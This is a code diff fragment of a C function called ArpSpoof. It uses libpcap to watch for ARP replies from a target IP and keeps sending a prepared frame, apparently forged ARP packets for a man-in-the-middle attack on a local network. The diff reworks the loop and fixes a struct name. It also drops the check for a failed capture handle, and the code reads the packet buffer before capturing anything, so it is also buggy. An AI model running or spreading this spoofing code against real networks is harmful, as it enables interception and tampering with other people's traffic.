@@ -71,20 +71,19 @@ void ArpSpoof(const char* if_name,const char* sender_ip_string,const char* targe
     char pcap_errbuf[PCAP_ERRBUF_SIZE];
     pcap_errbuf[0]='\0';
     pcap_t* pcap=pcap_open_live(if_name,96,0,0,pcap_errbuf);
-        fprintf(stderr,"%s\n",pcap_errbuf);
-    }
+    fprintf(stderr,"%s\n",pcap_errbuf);
 
-    struct pcap_pkhdr h;    
-    
-    if (!pcap) {
-       return; //exit(1);
-    }
-	    while(1){
-		if(packet[12]==0x08 && packet[13] == 0x06 && packet[14] == 0x00 && packet[15]==0x02 && memcmp(packet+0x26,(void*)inet_addr(sender_ip_string),4)==0)
-			packet=pcap_next(pcap,&h);//break;
-		else 
+    struct pcap_pkthdr h;    
+   
+    while(1){
+	if(packet[12]==0x08 && packet[13] == 0x06 && packet[14] == 0x00 && packet[15]==0x02 && memcmp(packet+0x26,(void*)inet_addr(sender_ip_string),4)==0)
+		packet=pcap_next(pcap,&h);//break;
+	else
+	{ 
+		packet=pcap_next(pcap,&h);
     	     	pcap_sendpacket(pcap,frame,sizeof(frame));
-	    }
+	}
+    }
     pcap_close(pcap);
     //close(fd);
     return;
